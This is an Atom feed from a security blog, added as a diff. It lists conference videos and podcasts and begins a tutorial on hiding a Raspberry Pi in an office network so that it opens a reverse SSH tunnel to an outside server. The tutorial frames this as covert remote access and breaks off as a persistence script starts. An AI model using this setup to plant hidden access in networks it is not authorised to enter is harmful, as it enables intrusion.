@@ -1,0 +1,809 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Category: featured | TunnelsUP]]></title>
+  <link href="http://tunnelsup.github.io/tup/tag/featured/atom.xml" rel="self"/>
+  <link href="http://tunnelsup.github.io/"/>
+  <updated>2016-09-29T22:17:21-07:00</updated>
+  <id>http://tunnelsup.github.io/</id>
+  <author>
+    <name><![CDATA[Jack]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[Online Security Conferences]]></title>
+    <link href="http://tunnelsup.github.io/online-security-conferences/"/>
+    <updated>2016-01-10T08:36:00-08:00</updated>
+    <id>http://tunnelsup.github.io/online-security-conferences</id>
+    <content type="html"><![CDATA[<p>Every month there are numerous cyber security conferences somewhere in the world. Many of them post their talks on YouTube after the conference. Below is a list of talks from security conferences. It&rsquo;s like attending a free virtual security conference!</p>
+
+<table class="table">
+    <thead>
+        <tr>
+            <th>Conference</th>
+            <th>Date Held</th>
+            <th>Location</th>
+        </tr>
+    </thead>
+    <tbody>
+
+
+
+
+
+
+        <tr>
+            <td><a href="https://www.youtube.com/playlist?list=PLNhlcxQZJSm_4V8VDudQyBFp8b91rBHTj">BSides Augusta</a></td>
+            <td>Sep 10, 2016</td>
+            <td>Augusta, GA, USA</td>
+        </tr>
+
+        <tr>
+            <td><a href="https://www.youtube.com/playlist?list=PL9fPq3eQfaaAvXV3hJc4yHuNxoviVckoE">DEFCON 24</a></td>
+            <td>Aug 4-7, 2016</td>
+            <td>Las Vegas, NV, USA</td>
+        </tr>
+
+        <tr>
+            <td><a href="https://www.youtube.com/playlist?list=PLH15HpR5qRsXm0-rMacuWBxWcB2fmsmEw">Black Hat 2016</a></td>
+            <td>July 30 - Aug 4, 2016</td>
+            <td>Las Vegas, NV USA</td>
+        </tr>
+
+
+        <tr>
+            <td><a href="https://www.youtube.com/playlist?list=PLpr-xdpM8wG-Kf1_BOnT2LFZU8_SXfpKL">AppSecEU 2016</a></td>
+            <td>July 2016</td>
+            <td>Rome, Italy</td>
+        </tr>
+
+        <tr>
+            <td><a href="http://www.irongeek.com/i.php?page=videos/oisf2016/mainlist">OISF 2016</a></td>
+            <td>July 2016</td>
+            <td>Ohio USA</td>
+        </tr>
+        <tr>
+            <td><a href="https://www.youtube.com/playlist?list=PLmfJypsykTLXdowhmaHaDJGlxmOBAGMYA">SteelCon 2016</a></td>
+            <td>July 15-17, 2016</td>
+            <td>Sheffield, UK</td>
+        </tr>
+        <tr>
+            <td><a href="https://www.irongeek.com/i.php?page=videos/bsidescleveland2016/mainlist">BSides Cleveland</a></td>
+            <td>July 2016</td>
+            <td>Cleveland, OH USA</td>
+        </tr>
+
+
+        <tr>
+            <td><a href="https://www.youtube.com/playlist?list=PLNhlcxQZJSm9HnVtDwMQ_JN1bCTuOedMh">Converge 2016</a></td>
+            <td>July 2016</td>
+            <td>Detroit, MI USA</td>
+        </tr>
+
+        <tr>
+            <td><a href="https://www.youtube.com/playlist?list=PLNhlcxQZJSm-AtNWUBV2eI_zNDGHRrbhk">BSides Detroit 2016</a></td>
+            <td>July 2016</td>
+            <td>Detroit, MI USA</td>
+        </tr>
+
+
+
+        <tr>
+            <td><a href="https://www.youtube.com/playlist?list=PLNhlcxQZJSm9NT-zQ9jHdYRhtGOASAYT7">ShowMeCon 2016</a></td>
+            <td>June 13-14, 2016</td>
+            <td>St. Louis, MO USA</td>
+        </tr>
+
+
+        <tr>
+            <td><a href="https://www.youtube.com/playlist?list=PLNhlcxQZJSm_fAztb-LmQapZiEM08cV-6">CircleCityCon 2016</a></td>
+            <td>June 10-12, 2016</td>
+            <td>Indianpolis, IN, USA</td>
+        </tr>
+
+        <tr>
+            <td><a href="https://www.youtube.com/playlist?list=PLmv8T5-GONwR_nTZuUyHN3AhIAOchFbU0">Hack In the Box (HITB)</a></td>
+            <td>May 23-27, 2016</td>
+            <td>Amsterdam Netherlands</td>
+        </tr>
+
+        <tr>
+            <td><a href="https://www.youtube.com/playlist?list=PLrwRJhfJmJRjDYmKTU9DY7XsG09QOBhwl">BSides Cincinnati 2016</a></td>
+            <td>May 21, 2016</td>
+            <td>Cincinnati, OH, USA</td>
+        </tr>
+
+
+        <tr>
+            <td><a href="https://www.youtube.com/playlist?list=PLNhlcxQZJSm96tDIXITUOBMjPrNunM4ux">NolaCon 2016</a></td>
+            <td>May 20-22, 2016</td>
+            <td>New Orleans, LA, USA</td>
+        </tr>
+        <tr>
+            <td><a href="https://www.youtube.com/playlist?list=PLuUtcRxSUZUpg-z0MkDrFrwMiiFMVr1yI">NorthSec 2016</a></td>
+            <td>May 17-22, 2016</td>
+            <td>Montreal, Canada</td>
+        </tr>
+
+        <tr>
+            <td><a href="https://www.youtube.com/playlist?list=PLfouvuAjspTokaa-LdUHqszL-KACkCsKT">SANS Cyber Threat Hunting Summit</a></td>
+            <td>April 2016</td>
+            <td>New Orleans, LA USA</td>
+        </tr>
+
+        <tr>
+            <td><a href="https://www.youtube.com/playlist?list=PLNhlcxQZJSm8OerdQZyQAdi7GG1ufgRaw">BSides Nashville</a></td>
+            <td>April 15, 2016</td>
+            <td>Nashville TN, USA</td>
+        </tr>
+
+        <tr>
+            <td><a href="http://www.irongeek.com/i.php?page=videos/aide2016/mainlist">AIDE 2016</a></td>
+            <td>April 20, 2016</td>
+            <td>Charleston, WV, USA</td>
+        </tr>
+
+
+        <tr>
+            <td><a href="https://www.youtube.com/playlist?list=PLNhlcxQZJSm82NKVBiHsntgwhpxVu8ZD9">Central Ohio Infosec Summit</a></td>
+            <td>Apr 1, 2016</td>
+            <td>Ohio, USA</td>
+        </tr>
+
+        <tr>
+            <td><a href="https://www.youtube.com/user/TROOPERScon">TROOPERS 16</a></td>
+            <td>Mar 14, 2016</td>
+            <td>Heidelberg, Germany</td>
+        </tr>
+
+
+        <tr>
+            <td><a href="https://www.youtube.com/playlist?list=PLNhlcxQZJSm8zJ6vqc98h375xgP-z4xtr">CypherCon 2016</a></td>
+            <td>Mar 13, 2016</td>
+            <td>Milwaukee, WI, USA</td>
+        </tr>
+
+        <tr>
+            <td><a href="https://www.youtube.com/playlist?list=PLNhlcxQZJSm_vceoN_dHHm44mpT_UbaWF">BSides SF</a></td>
+            <td>Mar 1st, 2016</td>
+            <td>San Francisco, CA, USA</td>
+        </tr>
+
+        <tr>
+            <td><a href="https://www.youtube.com/playlist?list=PLeUGLKUYzh_jqwnzJ7zOu7gPSX1FTmR1m">RSA 2016 (Keynotes)</a></td>
+            <td>Feb 29th, 2016</td>
+            <td>San Francisco, USA</td>
+        </tr>
+        <tr>
+            <td><a href="https://www.youtube.com/user/irongeek/search?query=bsides+indy&nohtml5=False">BSides Indy</a></td>
+            <td>Feb 21, 2016</td>
+            <td>Indianpolis, IN, USA</td>
+        </tr>
+        <tr>
+            <td><a href="http://www.irongeek.com/i.php?page=videos/bsideshuntsville2016/mainlist">BSides Huntsville</a></td>
+            <td>Feb 6, 2016</td>
+            <td>Huntsville AL, USA</td>
+        </tr>
+        <tr>
+            <td><a href="https://www.youtube.com/channel/UCIdV7bE97mSPTH1mOi_yUrw">Usenix Enigma Conference 2016</a></td>
+            <td>Jan 25, 2016</td>
+            <td>San Francisco, CA, USA</td>
+        </tr>
+
+        <tr>
+            <td><a href="https://www.irongeek.com/i.php?page=videos/bsidescolumbus2016/mainlist">BSides Columbus</a></td>
+            <td>Jan 18, 2016</td>
+            <td>Columbus, OH, USA</td>
+        </tr>
+
+        <tr>
+            <td><a href="https://www.youtube.com/playlist?list=PLJgHiyD1pZg70X3X3zjmdmZg3u0eqDFJ4">Schmoocon 2016</a></td>
+            <td>Jan 2016</td>
+            <td>Washington, DC, USA</td>
+        </tr>
+
+
+
+        <tr>
+            <td><a href="https://www.youtube.com/playlist?list=PL_IxoDz1Nq2YahR4DU9q5GWsSTle-mETW">Chaos Communication Congress 2015 (32C3)</a></td>
+            <td>Dec 27-30, 2015</td>
+            <td>Hamburg, Germany</td>
+        </tr>
+        <tr>
+            <td><a href="https://vimeo.com/noconname/videos">No Con Name 2015 [Spanish]</a></td>
+            <td>Dec 12, 2015</td>
+            <td>Barcelona, Spain</td>
+        </tr>
+
+
+        <tr>
+            <td><a href="https://www.youtube.com/playlist?list=PLdIqs92nsIzQvvbTiWLLjZOVE7jPBDomw">Passwords 2015</a></td>
+            <td>Dec 7-9, 2015</td>
+            <td>Cambridge, UK</td>
+        </tr>
+
+
+        <tr>
+            <td><a href="https://www.youtube.com/playlist?list=PLnwq8gv9MEKj6p8VtgCwFdh8uthLp75M3">DefCamp 2015</a></td>
+            <td>Nov 19-20, 2015</td>
+            <td>Bucharest, Romania</td>
+        </tr>
+
+        <tr>
+            <td><a href="https://www.youtube.com/playlist?list=PLxyG_Sh7NFechTfZb2DLQEUvy3FbaR3gD">BSides Winnipeg 2015</a></td>
+            <td>Nov 14-15, 2015</td>
+            <td>Winnipeg, Canada</td>
+        </tr>
+        <tr>
+            <td><a href="https://www.youtube.com/playlist?list=PLsEd7GTJqlRA2M6hwNzxbwPN04pf0F73U">BSides Charleston 2015</a></td>
+            <td>Nov 14, 2015</td>
+            <td>Charleston, NC, USA</td>
+        </tr>
+
+        <tr>
+            <td><a href="https://www.youtube.com/playlist?list=PL02T0JOKYEq52plvmxiJ1cSbwUgHHvP7H">BSides Toronto 2015</a></td>
+            <td>Nov. 7, 2015</td>
+            <td>Toronto, Canada</td>
+        </tr>
+
+        <tr>
+            <td><a href="https://www.youtube.com/playlist?list=PL-XyPQsyOrNEoJ4xC4Q5OY24Y5I-lUTRz">Code Blue 2015</a></td>
+            <td>Oct 28, 2015</td>
+            <td>Tokyo, Japan</td>
+        </tr>
+
+        <tr>
+            <td><a href="https://www.youtube.com/channel/UCEiHGeWgdIoLCzTLm_izCoQ/videos">Saint Con 2015</a></td>
+            <td>Oct 27-30, 2015</td>
+            <td>Ogden, UT, USA</td>
+        </tr>
+        <tr>
+            <td><a href="https://www.youtube.com/playlist?list=PLtb1FJdVWjUfZ9fWxPPCrOO7LUquB3WrB">BruCon 2015</a></td>
+            <td>Oct 26, 2015</td>
+            <td>Brussels, Belgium</td>
+        </tr>
+        <tr>
+            <td><a href="https://www.youtube.com/playlist?list=PLLEf-wPc7TyY6I8AtHvrSEAj3UNjRnpOZ">SkyDogCon 2015</a></td>
+            <td>Oct 23-25, 2015</td>
+            <td>Nashville, TN, USA</td>
+        </tr>
+
+        <tr>
+            <td><a href="https://vimeo.com/album/3682874">Ekoparty [Spanish]</a></td>
+            <td>Oct 21, 2015</td>
+            <td>Buenos Aires, Argentina</td>
+        </tr>
+
+        <tr>
+            <td><a href="http://sector.ca/presentations">Sector 2015</a></td>
+            <td>Oct 19-21, 2015</td>
+            <td>Toronto, Canada</td>
+        </tr>
+        <tr>
+            <td><a href="https://www.youtube.com/playlist?list=PLghf5UNZbzG0zLarfwpw4PxPTS0IWo8vB">CERT.pl Secure 2015</a></td>
+            <td>Oct 14, 2015</td>
+            <td>Warsaw, Poland</td>
+        </tr>
+
+        <tr>
+            <td><a href="https://www.youtube.com/playlist?list=PLmv8T5-GONwSuEm2XTeIVi6toZ8stS6J2">HITB SecConf 2015</a></td>
+            <td>Oct 13, 2015</td>
+            <td>Singapore, Maylasia</td>
+        </tr>
+
+        <tr>
+            <td><a href="https://www.youtube.com/playlist?list=PLNhlcxQZJSm86xYFgU3fRB84vvii9oAh0">Louisville Infosec 2015</a></td>
+            <td>Sep. 28, 2015</td>
+            <td>Louisville, KY, USA</td>
+        </tr>
+
+        <tr>
+            <td><a href="https://www.youtube.com/playlist?list=PLn8ut0t_rVT89PJEnacaOYrmRJQc0TeiQ">DerbyCon 5.0</a></td>
+            <td>Sep 23-27, 2015</td>
+            <td>Louisville, KY, USA</td>
+        </tr>
+        <tr>
+            <td><a href="https://www.youtube.com/playlist?list=PLpr-xdpM8wG93dG_L9QKs0W1cD-esQEzU">OWASP AppSec USA 2015</a></td>
+            <td>Sep 22-25, 2015</td>
+            <td>San Francisco, CA, USA</td>
+        </tr>
+
+        <tr>
+            <td><a href="https://www.youtube.com/playlist?list=PLNhlcxQZJSm_tRDcxhP9vldVoJhTkwdnt">BSides Augusta 2015</a></td>
+            <td>Sep 12, 2015</td>
+            <td>Augusta, GA, USA</td>
+        </tr>
+        <tr>
+            <td><a href="https://www.youtube.com/playlist?list=PLeeS-3Ml-rpoNWewUnljPP7QN4USn4c7H">Crypto 2015</a></td>
+            <td>Aug 16-20, 2015</td>
+            <td>Santa Barbara, CA, USA</td>
+        </tr>
+
+        <tr>
+            <td><a href="https://www.youtube.com/playlist?list=PL_IxoDz1Nq2ZrTckdtMUV4no50_-b9OkL">Chaos Communication Camp 2015 [German]</a></td>
+            <td>Aug 13-17, 2015</td>
+            <td>Zehdenick, Germany</td>
+        </tr>
+
+        <tr>
+            <td><a href="https://www.youtube.com/playlist?list=PLbRoZ5Rrl5lfeRixThHzgGYj1wu80JOh3">USENIX Security 2015</a></td>
+            <td>Aug 12-14, 2015</td>
+            <td>Washington, D.C., USA</td>
+        </tr>
+
+        <tr>
+            <td><a href="https://www.youtube.com/playlist?list=PL9fPq3eQfaaBuHqVvDzPoWxznYYmyx5UX">DEF CON 23</a></td>
+            <td>Aug 6-9, 2015</td>
+            <td>Las Vegas, NV, USA</td>
+        </tr>
+        <tr>
+            <td><a href="https://www.youtube.com/playlist?list=PLH15HpR5qRsXF78lrpWP2JKpPJs_AFnD7">Black Hat 2015</a></td>
+            <td>Aug 1-6, 2015</td>
+            <td>Las Vegas, NV, USA</td>
+        </tr>
+
+        <tr>
+            <td><a href="https://www.youtube.com/playlist?list=PLNhlcxQZJSm97gwg__BfWirG5NnkAAENL">BSides Detroit 2015</a></td>
+            <td>July 16-18, 2015</td>
+            <td>Detroit, MI, USA</td>
+        </tr>
+
+        <tr>
+            <td><a href="https://www.youtube.com/playlist?list=PLmfJypsykTLX9mDeChQ7fovybwYzQgr6j">SteelCon 2015</a></td>
+            <td>Jul 3-5, 2015</td>
+            <td>Sheffield, UK</td>
+        </tr>
+
+        <tr>
+            <td><a href="https://www.youtube.com/playlist?list=PLNhlcxQZJSm87UHyX3fVU_NnSRjM8CUUw">BSides Cleveland 2015</a></td>
+            <td>Jun 20, 2015</td>
+            <td>Cleveland, OH, USA</td>
+        </tr>
+        <tr>
+            <td><a href="https://www.youtube.com/playlist?list=PLNhlcxQZJSm9TV35bUYvhjUpdAR8iPT5R">CircleCityCon 2015</a></td>
+            <td>Jun 12-14, 2015</td>
+            <td>Indianapolis, IN, USA</td>
+        </tr>
+
+        <tr>
+            <td><a href="https://www.youtube.com/playlist?list=PLNhlcxQZJSm9zsNKfwujM4JgEk1wOc44m">ShowMeCon 2015</a></td>
+            <td>Jun 8-9, 2015</td>
+            <td>St. Charles, MO, USA</td>
+        </tr>
+        <tr>
+            <td><a href="https://www.youtube.com/playlist?list=PLcrUMxzVpi6waVMFpbc2MFrbE5uB_EPJU">BSides London 2015</a></td>
+            <td>Jun 3, 2015</td>
+            <td>London, UK</td>
+        </tr>
+
+        <tr>
+            <td><a href="https://www.youtube.com/playlist?list=PLJ7_KHVHtAm9YhIzWa_2A61dmFv8cTDO2">HITB AMS SecConfg 2015</a></td>
+            <td>May 26-29, 2015</td>
+            <td>Amsterdam, Netherlands</td>
+        </tr>
+
+        <tr>
+            <td><a href="https://www.youtube.com/playlist?list=PLuUtcRxSUZUpQAa54H6PKkfX6A48ruzhh">NorthSec Montreal 2015</a></td>
+            <td>May 19-22, 2015</td>
+            <td>Montreal, Canada</td>
+        </tr>
+        <tr>
+            <td><a href="https://www.youtube.com/playlist?list=PLpr-xdpM8wG-ZTcHhFfAeBthNVZVEtkg9">OWASP AppSec EU 2015</a></td>
+            <td>May 19-22, 2015</td>
+            <td>Amsterdam, Netherlands</td>
+        </tr>
+        <tr>
+            <td><a href="https://www.youtube.com/playlist?list=PLUOjNfYgonUsE3qq9AyqlFL1sXzZXFrtg">Rooted CON 2015 [Spanish]</a></td>
+            <td>May 5-7, 2015</td>
+            <td>Madrid, Spain</td>
+        </tr>
+        <tr>
+            <td><a href="https://www.youtube.com/playlist?list=PLREOJpYTa6C5Mia5gJawJyx0WnEPvaudE">SAS Global Forum 2015</a></td>
+            <td>Apr 26-29, 2015</td>
+            <td>Dallas, TX, USA</td>
+        </tr>
+
+
+
+        <tr>
+            <td><a href="https://www.youtube.com/playlist?list=PLeUGLKUYzh_hr2_j0RNVSD6wZQIhdfoGe">RSA 2015 (Keynotes)</a></td>
+            <td>Apr 20-24, 2015</td>
+            <td>San Francisco, CA, USA</td>
+        </tr>
+
+
+
+
+        <tr>
+            <td><a href="https://www.youtube.com/playlist?list=PLu1bAtIWt2VbXiy4kNWdtVkWiRWvPoeD6">BSides Orlando</a></td>
+            <td>Apr 11, 2015</td>
+            <td>Orlando, FL, USA</td>
+        </tr>
+        <tr>
+            <td><a href="https://vimeo.com/user18478112/videos/sort:date">Infiltrate 2015</a></td>
+            <td>Apr 2015</td>
+            <td>Miami Beach, FL, USA</td>
+        </tr>
+        <tr>
+            <td><a href="https://www.youtube.com/playlist?list=PLKpjtdatAwij7ajFwQSkmxFm43N9U_T3E">SyScan 2015</a></td>
+            <td>Mar 21-27, 2015</td>
+            <td>Singapore, Singapore</td>
+        </tr>
+
+        <tr>
+            <td><a href="https://www.youtube.com/channel/UCuJ0qrx-oNq2hxrUX5IYd9A/videos">BSides SLC 2015</a></td>
+            <td>Mar 21, 2015</td>
+            <td>Salt Lake City, UT, USA</td>
+        </tr>
+        <tr>
+            <td><a href="https://www.youtube.com/playlist?list=PLdh5UOMgeDvkWYaZcUrFagUY2zUtfMafR">Carolina Con 2015</a></td>
+            <td>Mar 4, 2015</td>
+            <td>Raleigh, NC, USA</td>
+        </tr>
+
+        <tr>
+            <td><a href="https://www.youtube.com/playlist?list=PLNhlcxQZJSm9EMEAOlWO40tv4A-2JERPb">BSides San Francisco 2015</a></td>
+            <td>Feb 28, 2015</td>
+            <td>San Francisco, CA, USA</td>
+        </tr>   
+
+        <tr>
+            <td><a href="https://www.youtube.com/playlist?list=PLXoRjc8jI5RQ5Rr--h0BnuYh17fuQyJwv">DEFCON | OWASP Lucknow InfoSec Conference</a></td>
+            <td>Feb 22, 2015</td>
+            <td>Lucknow, India</td>
+        </tr>
+
+        <tr>
+            <td><a href="https://www.youtube.com/playlist?list=PLNhlcxQZJSm_by2u3gZUlcPPU0IQtvRTS">BSides Tampa 2015</a></td>
+            <td>Feb 21, 2015</td>
+            <td>Tampa Bay, FL, USA</td>
+        </tr>
+
+
+        <tr>
+            <td><a href="https://www.youtube.com/user/nullcon/search?query=2015">NullCon Goa 2015</a></td>
+            <td>Feb 4-5, 2015</td>
+            <td>Goa, India</td>
+        </tr>
+        <tr>
+            <td><a href="https://www.youtube.com/playlist?list=PLfouvuAjspToHlyi9rnayB1WXFVmH037C">Cyber Threat Intelligence Summit 2015</a></td>
+            <td>Feb 2-9, 2015</td>
+            <td>Washington D.C., USA</td>
+        </tr>
+        <tr>
+            <td><a href="https://www.youtube.com/playlist?list=PLpr-xdpM8wG-xWNB98Q2uLN7O8E91xJzK">OWASP AppSec California 2015</a></td>
+            <td>Jan 26-28, 2015</td>
+            <td>Santa Monica, CA, USA</td>
+        </tr>
+        <tr>
+            <td><a href="https://www.youtube.com/playlist?list=PLNhlcxQZJSm-L0fEgmLzf3Rmyt45M5qw0">BSides Columbus 2015</a></td>
+            <td>Jan 19, 2015</td>
+            <td>Columbus, OH, USA</td>
+        </tr>
+        
+        <tr>
+            <td><a href="https://www.youtube.com/playlist?list=PLStO1VqVBvmHyVc71QLOCBKugWQyyM7WE">ShmooCon 2015</a></td>
+            <td>Jan 16-18, 2015</td>
+            <td>Washington D.C., USA</td>
+        </tr>
+        <tr>
+            <td><a href="https://www.youtube.com/playlist?list=PLSNlEg26NNpzyo5SOikogTjmACDFghLQP">FloCon 2015</a></td>
+            <td>Jan 12-15 2015</td>
+            <td>Portland, OR, USA</td>
+        </tr>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+        <tr>
+            <td><a href=""></a></td>
+            <td></td>
+            <td></td>
+        </tr>
+
+
+    </tbody>
+</table>
+
+
+<h2>Other Video Caches</h2>
+
+<p><a href="http://www.irongeek.com/">IronGeek &ndash; Adrian Crenshaw records a lot of these conferences. His site has more conferences and more detail for each talk.</a></p>
+
+<p>Rapid 7 <a href="https://www.rapid7.com/resources/videos/">videos</a> and <a href="https://www.rapid7.com/resources/webcasts/us.jsp">webcasts</a> are updated weekly and have a wide variety of topics.</p>
+
+<p><a href="https://www.youtube.com/watch?v=Go77RsVYujc&list=PLp3eqXqiGKwZ7OHGpk-a2VZ2xH2OyGtyf">Popular SANS Institute &amp; Security Videos</a></p>
+
+<p><a href="https://www.youtube.com/user/robtlee73/playlists">SANS Digital Forensics</a> has numerous playlists with lots of great content.</p>
+
+<p><a href="https://www.youtube.com/user/ISC2TV">(ISC)<sup>2</sup> YouTube channel</a></p>
+
+<p><a href="https://www.youtube.com/channel/UC3iAdvT7XGI7LtZxu4qHgRg">HP Security Research Playlist</a></p>
+
+<p><a href="https://www.youtube.com/playlist?list=PLTmfTMRCZvynGaHqbvALoJ2hGJvKvCJ9V">Cyberwarfare &amp; Computer Security Playlist</a></p>
+
+<p><a href="https://www.youtube.com/user/RSAConference/playlists">RSA Keynotes, Lectures, and Sessions</a></p>
+
+<p><a href="https://www.ciscolive.com">Cisco Live &ndash; Requires a CCO login but has most videos from Cisco Live events.</a></p>
+
+<p><a href="http://www.securitytube.net/">Security Tube</a> &ndash; A website that looks for security videos on youtube and provides links to them.</p>
+
+<h2>List of Security Conferences</h2>
+
+<p><a href="https://www.concise-courses.com/security/conferences-of-2015/">2015</a><br>
+<a href="https://www.concise-courses.com/security/conferences-of-2016/">2016</a></p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[7 Security Podcasts You Should be Listening to]]></title>
+    <link href="http://tunnelsup.github.io/7-security-podcasts-you-should-be-listening-to/"/>
+    <updated>2014-12-13T17:29:00-08:00</updated>
+    <id>http://tunnelsup.github.io/7-security-podcasts-you-should-be-listening-to</id>
+    <content type="html"><![CDATA[<p>Here&rsquo;s a list of the 7 best security podcasts on network security and hacking.</p>
+
+<h2>Daily Podcasts</h2>
+
+<h4>1. Internet Storm Center StormCasts</h4>
+
+<p><a href="https://isc2.sans.org/podcastdetail.html?id=4265">https://isc2.sans.org/podcastdetail.html?id=4265</a></p>
+
+<p>Listen to a <strong>daily</strong> wrapup of events from the SANS Internet Storm Center.</p>
+
+<h2>Weekly Podcasts</h2>
+
+<h4>2. Risky Business</h4>
+
+<p><a href="http://risky.biz/netcasts/risky-business">http://risky.biz/netcasts/risky-business</a></p>
+
+<p>Probably the best produced security podcast and my favorite of the bunch. Show starts with news, delivered by people who are very familiar with each story. Then the show does two interviews with a security expert, then a vendor.</p>
+
+<h4>3. Down the Security Rabbit Hole</h4>
+
+<p><a href="http://podcast.wh1t3rabbit.net/">http://podcast.wh1t3rabbit.net/</a></p>
+
+<p>Weekly security podcast covering news and events in the security realm. They often do interviews with security professionals and go over more of the business aspect of security.</p>
+
+<h4>4. Sophos Chet Chat</h4>
+
+<p><a href="http://www.sophos.com/en-us/company/podcasts.aspx">http://www.sophos.com/en-us/company/podcasts.aspx</a></p>
+
+<p>Sophos brings you impressive antivirus software and other security products. Two expert Sophos engineers do a weekly podcast covering security news and other security topics.</p>
+
+<h4>5. Security Weekly</h4>
+
+<p><a href="http://securityweekly.com/">http://securityweekly.com/</a></p>
+
+<p>Formerly PaulDotCom, listen/watch Paul give his weekly security podcast in which he discusses security news, research, hacker techniques, and technical how-tos.</p>
+
+<h4>6. Defensive Security Podcasts</h4>
+
+<p><a href="https://www.defensivesecurity.org/category/podcast">https://www.defensivesecurity.org/category/podcast</a></p>
+
+<p>A weekly discussion of security events in the news.</p>
+
+<h4>7. Southern Fried Security Podcast</h4>
+
+<p><a href="http://www.southernfriedsecurity.com/">http://www.southernfriedsecurity.com/</a></p>
+
+<p>A weekly discussion of security events in the news.</p>
+
+<h2>Still not enough?</h2>
+
+<p>There is a monthly <a href="http://www.cigital.com/silver-bullet">Cigital Silver Bullet</a> podcast which has good interviews.</p>
+
+<p>Like Bruce Schnier&rsquo;s articles but don&rsquo;t have time to read them? Get caught up with the <a href="http://crypto-gram.libsyn.com/">Crypto-Gram Security Podcast</a> where someone reads the latest articles to you.</p>
+
+<p>Try the <a href="https://www.grc.com/securitynow.htm">Security Now</a> podcast by Steve Gibson and Leo Laporte. It&rsquo;s one of my least favories because the content is not very rich and slowly delivered over the 2 hour show.</p>
+
+<p>There&rsquo;s also a <a href="https://www.trustedsec.com/podcast/">TrustedSec</a> podcast. I have a hard time tolerating this one becuase sometimes they like to spend 15 minutes just talking about the weather, before getting into anything security related.</p>
+
+<p><a href="http://www.pvcsec.com/">PVC Security Podcast</a> explores many topics in information security and often interviews guests and talks about interesting articles and current events.</p>
+
+<p><a href="http://www.timothydeblock.com/eis">Enterprise Information Security Podcast</a> covers many of the fundamental topics in the information security space. Often the show teaches or tackles a single question such as &ldquo;What is MS08-067?&rdquo;</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Subnet Calculator - IPv4/IPv6]]></title>
+    <link href="http://tunnelsup.github.io/subnet-calculator/"/>
+    <updated>2013-09-02T00:00:00-07:00</updated>
+    <id>http://tunnelsup.github.io/subnet-calculator</id>
+    <content type="html"><![CDATA[<p>Page has been moved. Please go to <a href="http://www.tunnelsup.com/subnet-calculator"><a href="http://www.tunnelsup.com/subnet-calculator">http://www.tunnelsup.com/subnet-calculator</a></a></p>
+
+<!-- This page exists only so it shows up in the 'all articles' page. Actual page found in source/subnet-calculator/index.html -->
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Raspberry Pi: Phoning home using a reverse remote ssh tunnel]]></title>
+    <link href="http://tunnelsup.github.io/raspberry-pi-phoning-home-using-a-reverse-remote-ssh-tunnel/"/>
+    <updated>2013-05-08T00:00:00-07:00</updated>
+    <id>http://tunnelsup.github.io/raspberry-pi-phoning-home-using-a-reverse-remote-ssh-tunnel</id>
+    <content type="html"><![CDATA[<p><img src="/images/pi6.jpg" alt="Pi IMG" /><br>
+What&rsquo;s this? Just an ordinary powerbrick? Read on to find out why this is an incredibly dangerous thing to see in your office.</p>
+
+<p>When I received my raspberry pi I immediately wanted to use it as a <del>hacking</del> remote tech support tool. The idea was to be able to plug it in somewhere and it be small enough that it&rsquo;s not noticed in someone&rsquo;s network. Then if I could access it remotely I am in their network and can do things.</p>
+
+<h2>Part 1: Setting up the Pi</h2>
+
+<p>The problem is that if I plug this in somewhere in the world and leave it I need it to phone home so I can gain remote connectivity to it. I know my home&rsquo;s IP but I don&rsquo;t know the Pi&rsquo;s IP. I want it to be a plug in and run away type of scenario and not one that I&rsquo;ll be hooking up any monitor or keyboard or anything.</p>
+
+<h3>Pre-configuration</h3>
+
+<p>Before beginning you need to have the following:</p>
+
+<ul>
+<li>Raspberry Pi with a Linux OS on it</li>
+<li>Raspberry Pi is configured to receive a DHCP address</li>
+<li>Raspberry Pi is configured to receive ssh connections</li>
+<li>A seperate linux server that is reachable by ssh from the internet. This server should have a static public IP.</li>
+</ul>
+
+
+<!--more-->
+
+
+<p>It should be easy enough to figure out how to complete these on your own. With the above, you should be able ssh to the Pi remotely if you know its IP. Well you don&rsquo;t know its IP and even if you did it is probably behind a firewall which makes it impossible to get to. Or so you think.</p>
+
+<p>What you&rsquo;ll need is a linux server that has a persistent IP. One that you can ssh into from anywhere in the world. Suppose it&rsquo;s IP is 25.25.25.25. Even though my home network gets a dynamic IP from my ISP it usually stays the same for weeks and even years. All I&rsquo;ve done is forwarded port 22 through the firewall to a linux server to make this work.</p>
+
+<h3>Setting up the ssh certificate on the Pi</h3>
+
+<p>From the Raspberry Pi you should be able to ssh to this linux server. Test it to be sure. So now you want to set it up so the authentication is certificate based (this way the Pi can be set up to auto ssh into the server without being prompted for a password).</p>
+
+<p>Follow this guide for setting up <a href="/ssh-without-password/">automatic ssh login using ssh keys</a>.</p>
+
+<h3>Creating the Reverse SSH tunnel</h3>
+
+<p>Now comes the fun part. Create a reverse remote ssh tunnel to that host to forward connections back to the Pi. Confused? Here look at this command you would issue from the Pi:</p>
+
+<p><code>
+ssh -N -R 2222:localhost:22 serverUser@25.25.25.25
+</code></p>
+
+<p>The Pi is ssh'ing to the server at 25.25.25.25 using the username &ldquo;serverUser&rdquo;. Upon doing so, it&rsquo;s telling that server to open port 2222. Any connections coming into the server on port 2222 forward them over the tunnel back to the Pi on port 22. The -N tag is saying we don&rsquo;t need to actually send any ssh commands once connected.</p>
+
+<p>Once the Pi sets up that remote tunnel; from the server it connected to you can do this:</p>
+
+<p><code>
+ssh -l piUser -p 2222 localhost
+</code></p>
+
+<p>Now you should be ssh&rsquo;d into the Pi using port 2222 on the linux server! Awesome!</p>
+
+<p>Why did this work? The linux server is listening on port 2222 for incoming ssh connections. If it receives one, it will forward all traffic it receives into the previous ssh connection that was established already. That is essentially what the remote tunnel does.</p>
+
+<h3>Making it persistent (always on)</h3>
+
+<p>Next is to make this a persistent thing. You want the Pi to keep trying to build this ssh tunnel always and if it goes down try to bring it back. We&rsquo;ll do this using a bash script and cron job.</p>
+
+<p>Create a file on the Pi called ~/create_ssh_tunnel.sh and put this in it:</p>
+
+<p>``` bash</p>
+
+<h1>!/bin/bash</h1>
+
+<p>createTunnel() {
